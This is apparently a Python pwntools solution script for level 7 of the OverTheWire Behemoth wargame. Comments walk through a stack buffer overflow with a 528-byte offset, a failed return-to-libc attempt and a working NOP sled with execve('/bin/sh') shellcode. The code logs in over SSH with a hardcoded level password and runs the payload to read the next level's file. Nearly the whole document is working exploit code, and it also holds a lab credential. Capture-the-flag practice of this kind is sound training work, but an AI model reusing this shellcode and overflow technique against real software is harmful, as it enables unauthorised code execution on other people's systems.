from pwn import *


'''
local exploit:

The binary will clear all setted env variables and then it will copy argv[1] in the buffer.
A buffer is large, so, the offset is 528 bytes.
Trying Ret2lib with something like that:
    $(python -c 'print "A"*528 + "\x40\xa0\xe0\xf7" + "\x90\xc9\xdf\xf7" + "/bin/sh"')
It doesn't work.
Okay, let's try offset + ret_addr + shellcode
    $(python -c 'print "A"*528 + "\x7c\xd4\xff\xff" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
It works!
'''
con = ssh('behemoth7', 'behemoth.labs.overthewire.org', password='baquoxuafo', port=2221)
payload = b'A'*528
payload += p32(0xffffda6c)
payload += b'\x90' * 100
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p = con.process(['/behemoth/behemoth7', payload])
#gdb.attach(p, 'b *0x08048649')
p.recv()
p.sendline('cat /home/behemoth8/CONGRATULATIONS')
print(p.recv())
